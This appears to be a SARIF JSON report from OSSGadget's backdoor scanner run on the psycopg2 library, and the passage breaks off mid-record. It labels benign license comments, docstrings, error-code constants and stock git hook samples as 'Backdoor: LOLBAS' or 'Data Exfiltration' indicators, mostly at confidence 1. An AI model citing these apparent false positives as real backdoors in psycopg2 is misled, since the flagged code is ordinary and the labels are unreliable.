{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/errorcodes.py"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 29,
                  "endLine": 42,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    if _cache:\n        return _cache[code]\n\n    # Generate the lookup map at first usage.\n    tmp = {}\n    for k, v in globals().items():\n        if isinstance(v, str) and len(v) in (2, 5):\n",
                    "rendered": {
                      "text": "    if _cache:\n        return _cache[code]\n\n    # Generate the lookup map at first usage.\n    tmp = {}\n    for k, v in globals().items():\n        if isinstance(v, str) and len(v) in (2, 5):\n",
                      "markdown": "`    if _cache:\n        return _cache[code]\n\n    # Generate the lookup map at first usage.\n    tmp = {}\n    for k, v in globals().items():\n        if isinstance(v, str) and len(v) in (2, 5):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/errorcodes.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 22,
                  "endLine": 17,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/errorcodes.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 42,
                  "endLine": 16,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/errorcodes.py"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 8,
                  "endLine": 268,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n# Class 28 - Invalid Authorization Specification\nINVALID_AUTHORIZATION_SPECIFICATION = '28000'\nINVALID_PASSWORD = '28P01'\n\n# Class 2B - Dependent Privilege Descriptors Still Exist\nDEPENDENT_PRIVILEGE_DESCRIPTORS_STILL_EXIST = '2B000'\n",
                    "rendered": {
                      "text": "\n# Class 28 - Invalid Authorization Specification\nINVALID_AUTHORIZATION_SPECIFICATION = '28000'\nINVALID_PASSWORD = '28P01'\n\n# Class 2B - Dependent Privilege Descriptors Still Exist\nDEPENDENT_PRIVILEGE_DESCRIPTORS_STILL_EXIST = '2B000'\n",
                      "markdown": "`\n# Class 28 - Invalid Authorization Specification\nINVALID_AUTHORIZATION_SPECIFICATION = '28000'\nINVALID_PASSWORD = '28P01'\n\n# Class 2B - Dependent Privilege Descriptors Still Exist\nDEPENDENT_PRIVILEGE_DESCRIPTORS_STILL_EXIST = '2B000'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/sql.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 22,
                  "endLine": 16,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/sql.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 42,
                  "endLine": 15,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_json.py"
                },
                "region": {
                  "startLine": 146,
                  "startColumn": 57,
                  "endLine": 146,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    Create and register :sql:`jsonb` typecasters for PostgreSQL 9.4 and following.\n\n    As in `register_default_json()`, the function allows to register a\n    customized *loads* function for the :sql:`jsonb` type at its known oid for\n    PostgreSQL 9.4 and following versions.  All the parameters have the same\n    meaning of `register_json()`.\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Create and register :sql:`jsonb` typecasters for PostgreSQL 9.4 and following.\n\n    As in `register_default_json()`, the function allows to register a\n    customized *loads* function for the :sql:`jsonb` type at its known oid for\n    PostgreSQL 9.4 and following versions.  All the parameters have the same\n    meaning of `register_json()`.\n    \"\"\"\n",
                      "markdown": "`    Create and register :sql:`jsonb` typecasters for PostgreSQL 9.4 and following.\n\n    As in `register_default_json()`, the function allows to register a\n    customized *loads* function for the :sql:`jsonb` type at its known oid for\n    PostgreSQL 9.4 and following versions.  All the parameters have the same\n    meaning of `register_json()`.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_json.py"
                },
                "region": {
                  "startLine": 183,
                  "startColumn": 42,
                  "endLine": 183,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    # Store the transaction status of the connection to revert it after use\n    conn_status = conn.status\n\n    # column typarray not available before PG 8.3\n    typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n    # get the oid for the hstore\n",
                    "rendered": {
                      "text": "    # Store the transaction status of the connection to revert it after use\n    conn_status = conn.status\n\n    # column typarray not available before PG 8.3\n    typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n    # get the oid for the hstore\n",
                      "markdown": "`    # Store the transaction status of the connection to revert it after use\n    conn_status = conn.status\n\n    # column typarray not available before PG 8.3\n    typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n    # get the oid for the hstore\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_json.py"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 55,
                  "endLine": 93,
                  "endColumn": 61,
                  "snippet": {
                    "text": "                  oid=None, array_oid=None, name='json'):\n    \"\"\"Create and register typecasters converting :sql:`json` type to Python objects.\n\n    :param conn_or_curs: a connection or cursor used to find the :sql:`json`\n        and :sql:`json[]` oids; the typecasters are registered in a scope\n        limited to this object, unless *globally* is set to `!True`. It can be\n        `!None` if the oids are provided\n",
                    "rendered": {
                      "text": "                  oid=None, array_oid=None, name='json'):\n    \"\"\"Create and register typecasters converting :sql:`json` type to Python objects.\n\n    :param conn_or_curs: a connection or cursor used to find the :sql:`json`\n        and :sql:`json[]` oids; the typecasters are registered in a scope\n        limited to this object, unless *globally* is set to `!True`. It can be\n        `!None` if the oids are provided\n",
                      "markdown": "`                  oid=None, array_oid=None, name='json'):\n    \"\"\"Create and register typecasters converting :sql:`json` type to Python objects.\n\n    :param conn_or_curs: a connection or cursor used to find the :sql:`json`\n        and :sql:`json[]` oids; the typecasters are registered in a scope\n        limited to this object, unless *globally* is set to `!True`. It can be\n        `!None` if the oids are provided\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_json.py"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 22,
                  "endLine": 20,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_json.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 42,
                  "endLine": 19,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_range.py"
                },
                "region": {
                  "startLine": 214,
                  "startColumn": 55,
                  "endLine": 214,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        schema-qualified\n    :param pyrange: a `Range` strict subclass, or just a name to give to a new\n        class\n    :param conn_or_curs: a connection or cursor used to find the oid of the\n        range and its subtype; the typecaster is registered in a scope limited\n        to this object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                    "rendered": {
                      "text": "        schema-qualified\n    :param pyrange: a `Range` strict subclass, or just a name to give to a new\n        class\n    :param conn_or_curs: a connection or cursor used to find the oid of the\n        range and its subtype; the typecaster is registered in a scope limited\n        to this object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                      "markdown": "`        schema-qualified\n    :param pyrange: a `Range` strict subclass, or just a name to give to a new\n        class\n    :param conn_or_curs: a connection or cursor used to find the oid of the\n        range and its subtype; the typecaster is registered in a scope limited\n        to this object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_range.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 22,
                  "endLine": 17,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/_range.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 42,
                  "endLine": 16,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-merge-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git merge\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message to\n# stderr if it wants to stop the merge commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 74,
                  "endLine": 74,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                    "rendered": {
                      "text": "\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n",
                      "markdown": "`\nif test \"$GIT_SENDEMAIL_FILE_COUNTER\" = \"$GIT_SENDEMAIL_FILE_TOTAL\"\nthen\n\tgit config --unset-all sendemail.validateWorktree &&\n\ttrap 'git worktree remove -ff \"$worktree\"' EXIT &&\n\tvalidate_series\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 2,
                  "endLine": 65,
                  "endColumn": 8,
                  "snippet": {
                    "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                    "rendered": {
                      "text": "unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n",
                      "markdown": "`unset GIT_DIR GIT_WORK_TREE\ncd \"$worktree\" &&\n\nif grep -q \"^diff --git \" \"$1\"\nthen\n\tvalidate_patch \"$1\"\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 54,
                  "endLine": 54,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                    "rendered": {
                      "text": "\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n",
                      "markdown": "`\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\nfi || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 53,
                  "endLine": 53,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                    "rendered": {
                      "text": "\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n",
                      "markdown": "`\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\nelse\n\tworktree=$(git config --get sendemail.validateWorktree)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 27,
                  "endLine": 51,
                  "endColumn": 33,
                  "snippet": {
                    "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                    "rendered": {
                      "text": "if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n",
                      "markdown": "`if test \"$GIT_SENDEMAIL_FILE_COUNTER\" = 1\nthen\n\tremote=$(git config --default origin --get sendemail.validateRemote) &&\n\tref=$(git config --default HEAD --get sendemail.validateRemoteRef) &&\n\tworktree=$(mktemp --tmpdir -d sendemail-validate.XXXXXXX) &&\n\tgit worktree add -fd --checkout \"$worktree\" \"refs/remotes/$remote/$ref\" &&\n\tgit config --replace-all sendemail.validateWorktree \"$worktree\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/sendemail-validate.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
                    "rendered": {
                      "text": "validate_patch () {\n\tfile=\"$1\"\n\t# Ensure that the patch applies without conflicts.\n\tgit am -3 \"$file\" || return\n\t# TODO: Replace with appropriate checks for this patch\n\t# (e.g. checkpatch.pl).\n\ttrue\n",
